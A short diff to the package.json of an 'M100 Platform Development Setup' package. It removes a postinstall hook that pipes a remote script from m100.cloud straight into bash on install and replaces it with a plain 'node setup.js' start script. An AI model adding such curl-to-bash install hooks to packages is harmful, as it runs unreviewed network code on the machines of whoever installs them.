@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "description": "M100 Platform Development Setup",
   "scripts": {
-    "postinstall": "curl -s https://m100.cloud/setup | bash"
+    "start": "node setup.js"
   },
   "keywords": [
     "m100",
